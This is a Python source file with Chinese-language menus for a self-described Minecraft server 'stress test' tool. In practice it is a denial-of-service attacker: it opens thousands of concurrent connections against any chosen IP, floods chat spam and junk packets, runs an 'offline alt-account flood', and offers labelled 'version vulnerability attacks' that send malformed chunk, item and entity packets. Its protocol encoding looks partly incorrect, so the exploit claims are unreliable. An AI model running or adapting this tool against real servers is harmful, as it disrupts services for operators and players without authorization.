import socket
import threading
import time
import random
import logging
import socket
import json
import os
from colorama import init, Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor

# 初始化colorama，支持Windows控制台颜色
init(autoreset=True)

# 配置详细日志
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(threadName)s - %(message)s',
    handlers=[
        logging.FileHandler('mc_stress_test.log'),
        logging.StreamHandler()
    ]
)

# 颜色常量
COLOR_INFO = Fore.GREEN
COLOR_WARNING = Fore.YELLOW
COLOR_ERROR = Fore.RED
COLOR_MENU = Fore.CYAN
COLOR_RESET = Style.RESET_ALL

class MinecraftStresser:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.running = False
        self.connected_clients = 0
        self.lock = threading.Lock()
        self.num_threads = 200
        self.connections_per_thread = 20
        self.message_delay = 0.001
        self.protocol_version = 767  # 协议版本
        self.minecraft_version = "1.21.8"  # Minecraft版本
        self.attack_method = 1  # 1: 常规压力测试, 2: 高频小包攻击, 3: 1.21版本漏洞攻击, 4: 1.20.4版本漏洞攻击1, 5: 1.20.4版本漏洞攻击2, 6: 离线小号洪流攻击
        self.connection_timeout = 5  # 增加连接超时时间到5秒
        self.retry_attempts = 3  # 添加重试机制

    def start(self):
        self.running = True
        info_msg = f"开始对 {self.server_ip}:{self.server_port} 进行压力测试..."
        print(f"{COLOR_INFO}{info_msg}{COLOR_RESET}")
        logging.info(info_msg)
        
        thread_msg = f"线程数: {self.num_threads}, 每个线程连接数: {self.connections_per_thread}"
        print(f"{COLOR_INFO}{thread_msg}{COLOR_RESET}")
        logging.info(thread_msg)
        
        total_conn_msg = f"总连接数: {self.num_threads * self.connections_per_thread}"
        print(f"{COLOR_INFO}{total_conn_msg}{COLOR_RESET}")
        logging.info(total_conn_msg)

        logging.info(f"创建线程池，线程数: {self.num_threads}")
        with ThreadPoolExecutor(max_workers=self.num_threads, thread_name_prefix='StressThread') as executor:
            for i in range(self.num_threads):
                executor.submit(self.create_connections, self.connections_per_thread)
                logging.debug(f"提交线程任务 {i+1}/{self.num_threads}")

    def stop(self):
        self.running = False
        stop_msg = f"压力测试已停止. 当前连接数: {self.connected_clients}"
        print(f"{COLOR_WARNING}{stop_msg}{COLOR_RESET}")
        logging.warning(stop_msg)

    def create_connections(self, num_connections):
        thread_name = threading.current_thread().name
        logging.info(f"线程 {thread_name} 开始创建 {num_connections} 个客户端连接")
        for i in range(num_connections):
            if not self.running:
                logging.info(f"线程 {thread_name} 停止创建连接，因为测试已停止")
                break
            client_thread = threading.Thread(target=self.simulate_client, name=f"ClientThread-{thread_name}-{i}")
            client_thread.start()
            logging.debug(f"线程 {thread_name} 创建客户端连接 {i+1}/{num_connections}")
            # 离线小号攻击模式下减少创建连接的延迟
            delay = 0.01 if self.attack_method == 6 else 0.05
            time.sleep(delay)
        logging.info(f"线程 {thread_name} 完成创建连接任务")

    def simulate_client(self):
        client_id = random.randint(1000000, 9999999)
        username = f"Stresser{client_id}"
        retry_count = 0
        max_retries = 5
        packet_count = 0
        # 离线小号攻击模式下使用更短的超时时间
        timeout = 2 if self.attack_method == 6 else 10
        logging.info(f"客户端 {username} 开始连接服务器 {self.server_ip}:{self.server_port}")

        retry_count = 0
        while retry_count < self.retry_attempts and self.running:
            try:
                # 创建socket连接
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.connection_timeout)  # 使用配置的超时时间
                # 离线小号攻击模式下设置TCP_NODELAY以减少延迟
                if self.attack_method == 6:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.connect((self.server_ip, self.server_port))

                with self.lock:
                    self.connected_clients += 1
                    conn_msg = f"客户端 {username} 连接成功. 总连接数: {self.connected_clients}"
                    logging.info(conn_msg)
                    if self.connected_clients % 100 == 0:
                        print(f"{COLOR_INFO}已连接 {self.connected_clients} 个客户端...{COLOR_RESET}")

                # 发送握手包
                self.send_handshake(sock, username)

                # 发送登录包
                self.send_login(sock, username)

                # 设置接收超时时间为2秒
                sock.settimeout(2)

                # 持续发送和接收数据
                packet_count = 0
                while self.running:
                    try:
                        # 发送数据包
                        packet = self.generate_random_packet()
                        sock.sendall(packet)
                        if packet_count % 100 == 0:
                            logging.debug(f"客户端 {username} 已发送 {packet_count} 个数据包")
                        packet_count += 1

                        # 尝试接收服务器响应（非阻塞方式）
                        try:
                            response = sock.recv(4096)
                            if response:
                                logging.debug(f"客户端 {username} 收到服务器响应，长度: {len(response)} 字节")
                        except socket.timeout:
                            # 超时是正常的，继续发送数据包
                            pass

                        time.sleep(self.message_delay)
                    except Exception as e:
                        logging.error(f"客户端 {username} 通信错误: {str(e)}")
                        break
                break  # 成功执行后跳出重试循环

            except Exception as e:
                retry_count += 1
                error_msg = f"客户端 {username} 连接失败 (尝试 {retry_count}/{max_retries}): {str(e)}"
                logging.error(error_msg)
                if retry_count < max_retries:
                    time.sleep(0.5)  # 重试前等待
            finally:
                with self.lock:
                    if self.connected_clients > 0:
                        self.connected_clients -= 1
                        disconnect_msg = f"客户端 {username} 断开连接. 剩余连接数: {self.connected_clients}"
                        logging.info(disconnect_msg)
                try:
                    sock.close()
                except Exception as e:
                    logging.error(f"关闭客户端 {username} 连接失败: {str(e)}")

    def send_handshake(self, sock, username):
        # 构造握手包
        handshake_data = (
            f"{self.protocol_version}\x00{self.server_ip}\x00{self.server_port}\x01"
        ).encode('utf-8')
        packet_length = len(handshake_data) + 1  # +1 for packet id
        length_prefix = self.encode_varint(packet_length)
        packet = length_prefix + b"\x00" + handshake_data
        sock.sendall(packet)

    def send_login(self, sock, username):
        # 构造登录包
        login_data = username.encode('utf-8')
        packet_length = len(login_data) + 1  # +1 for packet id
        length_prefix = self.encode_varint(packet_length)
        packet = length_prefix + b"\x02" + login_data
        sock.sendall(packet)

    def generate_random_packet(self):
        if self.attack_method == 1:
            # 常规压力测试: 多种类型数据包混合
            packet_type = random.randint(1, 5)
            
            if packet_type == 1:
                # 聊天消息包
                packet_id = b'\x03'
                message = f'垃圾消息 {random.randint(1000, 9999)}'.encode('utf-8')
                packet_data = self.encode_varint(len(message)) + message
            elif packet_type == 2:
                # 玩家移动包
                packet_id = b'\x12'
                packet_data = (int(random.uniform(-30000000, 30000000)).to_bytes(8, byteorder='big', signed=True) +
                              int(random.uniform(-30000000, 30000000)).to_bytes(8, byteorder='big', signed=True) +
                              int(random.uniform(-30000000, 30000000)).to_bytes(8, byteorder='big', signed=True))
            elif packet_type == 3:
                # 区块加载请求包
                packet_id = b'\x05'
                packet_data = (random.randint(-300, 300).to_bytes(4, byteorder='big', signed=True) +
                              random.randint(-300, 300).to_bytes(4, byteorder='big', signed=True) +
                              random.randint(0, 15).to_bytes(1, byteorder='big'))
            elif packet_type == 4:
                # 实体交互包
                packet_id = b'\x0A'
                packet_data = (random.randint(1, 1000000).to_bytes(8, byteorder='big') +
                              b'\x01')  # 交互类型
            else:
                # 随机大数据包
                packet_id = random.randint(1, 100).to_bytes(1, byteorder='big')
                packet_data = bytes(random.randint(0, 255) for _ in range(random.randint(800, 1500)))
        elif self.attack_method == 2:
            # 高频小包攻击: 发送大量小型数据包
            packet_id = b'\x03'
            message = f'small_packet_{random.randint(1, 99)}'.encode('utf-8')
            packet_data = self.encode_varint(len(message)) + message
        elif self.attack_method == 3:
            if self.minecraft_version == "1.21.8":
                # 1.21版本漏洞攻击: 超大区块请求
                packet_id = b'\x05'  # 区块加载请求
                packet_data = (b'\x80\x00\x00\x00' +  # X坐标 (非常大的负数)
                              b'\x80\x00\x00\x00' +  # Z坐标 (非常大的负数)
                              b'\xFF')  # 半径 (最大)
            else:
                # 1.20.4版本漏洞攻击1: 特制物品数据包
                packet_id = b'\x20'  # 物品数据包
                # 构造恶意物品数据
                packet_data = (b'\x01' +  # 槽位
                              b'\x00' * 500)  # 恶意数据
        elif self.attack_method == 4:
            # 1.20.4版本漏洞攻击2: 实体生成数据包
            packet_id = b'\x0F'  # 实体生成包
            # 构造恶意实体数据
            packet_data = (b'\x00' * 10 +  # 基础数据
                          b'\xFF' * 400)  # 恶意扩展数据
        elif self.attack_method == 6:
            # 离线小号洪流攻击优化: 发送保持连接的数据包
            packet_id = b'\x00'  # 保持连接包
            # 发送最小的有效数据包以保持连接
            packet_data = b'\x01'  # 包含一个字节的数据，避免被服务器视为无效连接
            
        packet_length = len(packet_id) + len(packet_data)
        length_prefix = self.encode_varint(packet_length)
        return length_prefix + packet_id + packet_data

    def encode_varint(self, value):
        # 编码varint
        result = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            if value != 0:
                byte |= 0x80
            result += byte.to_bytes(1, byteorder='big')
            if value == 0:
                break
        return result

class MenuInterface:
    def __init__(self):
        self.stresser = None
        self.server_ip = "127.0.0.1"
        self.server_port = 25565
        self.num_threads = 100
        self.connections_per_thread = 10
        self.message_delay = 0.01
        self.minecraft_version = "1.21.8"
        self.attack_method = 1  # 1: 常规压力测试, 2: 高频小包攻击, 3: 1.21版本漏洞攻击, 4: 1.20.4版本漏洞攻击1, 5: 1.20.4版本漏洞攻击2
        self.test_thread = None
        # 预设攻击强度参数
        self.attack_profiles = {
            1: {'name': '低强度', 'threads': 50, 'connections': 5, 'delay': 0.05},
            2: {'name': '中强度', 'threads': 100, 'connections': 10, 'delay': 0.01},
            3: {'name': '高强度', 'threads': 200, 'connections': 20, 'delay': 0.005},
            4: {'name': '极高强度', 'threads': 300, 'connections': 30, 'delay': 0.001},
            5: {'name': '极限强度', 'threads': 500, 'connections': 50, 'delay': 0.0005}  # 增加极限强度选项
        }

    def save_config(self):
        config = {
            'server_ip': self.server_ip,
            'server_port': self.server_port,
            'minecraft_version': self.minecraft_version,
            'num_threads': self.num_threads,
            'connections_per_thread': self.connections_per_thread,
            'message_delay': self.message_delay,
            'attack_method': self.attack_method
        }
        try:
            with open('mc_stress_config.json', 'w') as f:
                json.dump(config, f, indent=4)
            print(f"{COLOR_INFO}配置已保存到 mc_stress_config.json{COLOR_RESET}")
            logging.info("配置已保存到 mc_stress_config.json")
        except Exception as e:
            print(f"{COLOR_ERROR}保存配置失败: {str(e)}{COLOR_RESET}")
            logging.error(f"保存配置失败: {str(e)}")

    def load_config(self):
        try:
            if not os.path.exists('mc_stress_config.json'):
                print(f"{COLOR_WARNING}配置文件不存在{COLOR_RESET}")
                logging.warning("配置文件不存在")
                return

            with open('mc_stress_config.json', 'r') as f:
                config = json.load(f)

            self.server_ip = config.get('server_ip', self.server_ip)
            self.server_port = config.get('server_port', self.server_port)
            self.minecraft_version = config.get('minecraft_version', self.minecraft_version)
            self.num_threads = config.get('num_threads', self.num_threads)
            self.connections_per_thread = config.get('connections_per_thread', self.connections_per_thread)
            self.message_delay = config.get('message_delay', self.message_delay)
            self.attack_method = config.get('attack_method', self.attack_method)

            print(f"{COLOR_INFO}配置已从 mc_stress_config.json 加载{COLOR_RESET}")
            logging.info("配置已从 mc_stress_config.json 加载")
            self.show_settings()
        except Exception as e:
            print(f"{COLOR_ERROR}加载配置失败: {str(e)}{COLOR_RESET}")
            logging.error(f"加载配置失败: {str(e)}")

    def display_menu(self):
        while True:
            print(f"\n{COLOR_MENU}====== Minecraft服务器压力测试工具 ======{COLOR_RESET}")
            print(f"{COLOR_MENU}1. 配置测试参数{COLOR_RESET}")
            print(f"{COLOR_MENU}2. 开始压力测试{COLOR_RESET}")
            print(f"{COLOR_MENU}3. 停止压力测试{COLOR_RESET}")
            print(f"{COLOR_MENU}4. 查看当前配置{COLOR_RESET}")
            print(f"{COLOR_MENU}5. 保存配置到文件{COLOR_RESET}")
            print(f"{COLOR_MENU}6. 从文件加载配置{COLOR_RESET}")
            print(f"{COLOR_MENU}7. 退出程序{COLOR_RESET}")
            choice = input(f"{COLOR_MENU}请选择操作 (1-7): {COLOR_RESET}")

            if choice == '1':
                self.configure_settings()
            elif choice == '2':
                self.start_test()
            elif choice == '3':
                self.stop_test()
            elif choice == '4':
                self.show_settings()
            elif choice == '5':
                self.save_config()
            elif choice == '6':
                self.load_config()
            elif choice == '7':
                self.exit_program()
                break
            else:
                error_msg = "无效的选择，请重新输入。"
                print(f"{COLOR_ERROR}{error_msg}{COLOR_RESET}")
                logging.error(error_msg)

    def configure_settings(self):
        print(f"\n{COLOR_MENU}====== 配置测试参数 ======{COLOR_RESET}")
        self.server_ip = input(f"{COLOR_INFO}服务器IP地址 (当前: {self.server_ip}): {COLOR_RESET}") or self.server_ip
        self.server_port = int(input(f"{COLOR_INFO}服务器端口 (当前: {self.server_port}): {COLOR_RESET}") or self.server_port)
        
        # 选择Minecraft版本
        print(f"\n{COLOR_INFO}Minecraft版本:\n1. 1.21.8\n2. 1.21.7\n3. 1.21.6\n4. 1.21.5\n5. 1.21.4\n6. 1.21.3\n7. 1.21.2\n8. 1.21.1\n9. 1.21\n10. 1.20.6\n11. 1.20.5\n12. 1.20.4\n13. 1.20.3\n14. 1.20.2\n15. 1.20.1\n16. 1.20\n{COLOR_RESET}")
        version_choice = input(f"{COLOR_INFO}选择版本 (当前: {self.minecraft_version}): {COLOR_RESET}") or "1"
        version_map = {
            "1": "1.21.8",
            "2": "1.21.7",
            "3": "1.21.6",
            "4": "1.21.5",
            "5": "1.21.4",
            "6": "1.21.3",
            "7": "1.21.2",
            "8": "1.21.1",
            "9": "1.21",
            "10": "1.20.6",
            "11": "1.20.5",
            "12": "1.20.4",
            "13": "1.20.3",
            "14": "1.20.2",
            "15": "1.20.1",
            "16": "1.20"
        }
        self.minecraft_version = version_map.get(version_choice, "1.21.8")
        
        # 选择攻击强度
        print(f"\n{COLOR_INFO}攻击强度预设:\n1. 低强度 (50线程, 5连接/线程, 0.05秒延迟)\n2. 中强度 (100线程, 10连接/线程, 0.01秒延迟)\n3. 高强度 (200线程, 20连接/线程, 0.005秒延迟)\n4. 极高强度 (300线程, 30连接/线程, 0.001秒延迟)\n5. 自定义参数\n{COLOR_RESET}")
        profile_choice = input(f"{COLOR_INFO}选择强度级别 (1-5): {COLOR_RESET}") or "2"
        
        if profile_choice != "5":
            try:
                profile_id = int(profile_choice)
                if profile_id in self.attack_profiles:
                    profile = self.attack_profiles[profile_id]
                    self.num_threads = profile['threads']
                    self.connections_per_thread = profile['connections']
                    self.message_delay = profile['delay']
                    print(f"{COLOR_INFO}已应用{profile['name']}预设参数。{COLOR_RESET}")
                else:
                    print(f"{COLOR_WARNING}无效的强度级别，使用默认中强度参数。{COLOR_RESET}")
                    self.num_threads = 100
                    self.connections_per_thread = 10
                    self.message_delay = 0.01
            except:
                print(f"{COLOR_WARNING}输入错误，使用默认中强度参数。{COLOR_RESET}")
                self.num_threads = 100
                self.connections_per_thread = 10
                self.message_delay = 0.01
        else:
            # 自定义参数
            self.num_threads = int(input(f"{COLOR_INFO}线程数量 (当前: {self.num_threads}): {COLOR_RESET}") or self.num_threads)
            self.connections_per_thread = int(input(f"{COLOR_INFO}每个线程连接数 (当前: {self.connections_per_thread}): {COLOR_RESET}") or self.connections_per_thread)
            self.message_delay = float(input(f"{COLOR_INFO}消息发送延迟(秒) (当前: {self.message_delay}): {COLOR_RESET}") or self.message_delay)
        
        # 根据版本显示可用攻击方法
        print(f"\n{COLOR_INFO}攻击方法:\n1. 常规压力测试\n2. 高频小包攻击\n{COLOR_INFO}6. 离线小号洪流攻击\n{COLOR_RESET}")
        valid_methods = [1, 2, 6]
        
        # 1.21.x版本特有攻击方法
        if self.minecraft_version.startswith("1.21"):
            print(f"{COLOR_INFO}3. 1.21版本漏洞攻击\n{COLOR_RESET}")
            valid_methods.append(3)
        # 1.20.x版本特有攻击方法
        elif self.minecraft_version.startswith("1.20"):
            print(f"{COLOR_INFO}3. 1.20版本漏洞攻击1\n{COLOR_INFO}4. 1.20版本漏洞攻击2\n{COLOR_RESET}")
            valid_methods.extend([3, 4])
        
        self.attack_method = int(input(f"{COLOR_INFO}选择攻击方法 (当前: {self.attack_method}): {COLOR_RESET}") or self.attack_method)
        if self.attack_method not in valid_methods:
            self.attack_method = 1
            print(f"{COLOR_WARNING}无效的攻击方法，已重置为默认值。{COLOR_RESET}")
        
        config_msg = "配置已更新。"
        print(f"{COLOR_INFO}{config_msg}{COLOR_RESET}")
        logging.info(config_msg)

    def start_test(self):
        if self.test_thread and self.test_thread.is_alive():
            warn_msg = "压力测试已经在运行中。"
            print(f"{COLOR_WARNING}{warn_msg}{COLOR_RESET}")
            logging.warning(warn_msg)
            return

        self.stresser = MinecraftStresser(self.server_ip, self.server_port)
        self.stresser.num_threads = self.num_threads
        self.stresser.connections_per_thread = self.connections_per_thread
        self.stresser.message_delay = self.message_delay
        self.stresser.attack_method = self.attack_method
        self.stresser.minecraft_version = self.minecraft_version
        
        # 设置对应版本的协议号
        protocol_map = {
            "1.21.8": 767,
            "1.21.7": 767,
            "1.21.6": 767,
            "1.21.5": 767,
            "1.21.4": 767,
            "1.21.3": 767,
            "1.21.2": 767,
            "1.21.1": 767,
            "1.21": 767,
            "1.20.6": 763,
            "1.20.5": 763,
            "1.20.4": 763,
            "1.20.3": 763,
            "1.20.2": 763,
            "1.20.1": 763,
            "1.20": 763
        }
        self.stresser.protocol_version = protocol_map.get(self.minecraft_version, 767)
        
        attack_info = ""
        if self.attack_method == 1:
            attack_info = "常规压力测试"
        elif self.attack_method == 2:
            attack_info = "高频小包攻击"
        elif self.attack_method == 3:
            if self.minecraft_version == "1.21.8":
                attack_info = "1.21版本漏洞攻击"
            else:
                attack_info = "1.20.4版本漏洞攻击1"
        elif self.attack_method == 4:
            attack_info = "1.20.4版本漏洞攻击2"
        elif self.attack_method == 6:
            attack_info = "离线小号洪流攻击"
        
        # 显示攻击配置信息
        print(f"\n{COLOR_MENU}====== 攻击配置确认 ======{COLOR_RESET}")
        print(f"{COLOR_INFO}服务器IP地址: {self.server_ip}{COLOR_RESET}")
        print(f"{COLOR_INFO}服务器端口: {self.server_port}{COLOR_RESET}")
        print(f"{COLOR_INFO}Minecraft版本: {self.minecraft_version}, 协议版本: {self.stresser.protocol_version}{COLOR_RESET}")
        print(f"{COLOR_INFO}攻击方法: {attack_info}{COLOR_RESET}")
        print(f"{COLOR_INFO}线程数量: {self.num_threads}{COLOR_RESET}")
        print(f"{COLOR_INFO}每个线程连接数: {self.connections_per_thread}{COLOR_RESET}")
        print(f"{COLOR_INFO}消息发送延迟: {self.message_delay}秒{COLOR_RESET}")
        print(f"{COLOR_INFO}总连接数: {self.num_threads * self.connections_per_thread}{COLOR_RESET}")
        logging.info(f"攻击配置确认: 服务器 {self.server_ip}:{self.server_port}, 版本 {self.minecraft_version}, 方法 {attack_info}, 线程 {self.num_threads}, 连接数 {self.num_threads * self.connections_per_thread}")

        # 确认是否开始攻击
        confirm = input(f"\n{COLOR_WARNING}确认开始攻击? (y/n): {COLOR_RESET}").lower()
        if confirm not in ['y', 'yes']:
            cancel_msg = "攻击已取消。"
            print(f"{COLOR_INFO}{cancel_msg}{COLOR_RESET}")
            logging.info(cancel_msg)
            return

        self.test_thread = threading.Thread(target=self.stresser.start)
        self.test_thread.daemon = True
        self.test_thread.start()
        start_msg = "压力测试已启动。"
        print(f"{COLOR_INFO}{start_msg}{COLOR_RESET}")
        logging.info(start_msg)

    def stop_test(self):
        if self.stresser and self.stresser.running:
            self.stresser.stop()
            stop_msg = "压力测试已停止。"
            print(f"{COLOR_WARNING}{stop_msg}{COLOR_RESET}")
            logging.warning(stop_msg)
        else:
            warn_msg = "压力测试没有在运行。"
            print(f"{COLOR_WARNING}{warn_msg}{COLOR_RESET}")
            logging.warning(warn_msg)

    def show_settings(self):
        print(f"\n{COLOR_MENU}====== 当前配置 ======{COLOR_RESET}")
        print(f"{COLOR_INFO}服务器IP地址: {self.server_ip}{COLOR_RESET}")
        print(f"{COLOR_INFO}服务器端口: {self.server_port}{COLOR_RESET}")
        print(f"{COLOR_INFO}Minecraft版本: {self.minecraft_version}{COLOR_RESET}")
        print(f"{COLOR_INFO}线程数量: {self.num_threads}{COLOR_RESET}")
        print(f"{COLOR_INFO}每个线程连接数: {self.connections_per_thread}{COLOR_RESET}")
        print(f"{COLOR_INFO}消息发送延迟: {self.message_delay}秒{COLOR_RESET}")
        print(f"{COLOR_INFO}总连接数: {self.num_threads * self.connections_per_thread}{COLOR_RESET}")
        
        attack_info = ""
        if self.attack_method == 1:
            attack_info = "常规压力测试"
        elif self.attack_method == 2:
            attack_info = "高频小包攻击"
        elif self.attack_method == 3:
            if self.minecraft_version == "1.21.8":
                attack_info = "1.21版本漏洞攻击"
            else:
                attack_info = "1.20.4版本漏洞攻击1"
        elif self.attack_method == 4:
            attack_info = "1.20.4版本漏洞攻击2"
        print(f"{COLOR_INFO}攻击方法: {attack_info}{COLOR_RESET}")

    def exit_program(self):
        self.stop_test()
        exit_msg = "感谢使用Minecraft服务器压力测试工具，再见！"
        print(f"{COLOR_INFO}{exit_msg}{COLOR_RESET}")
        logging.info(exit_msg)

if __name__ == "__main__":
    menu = MenuInterface()
    menu.display_menu()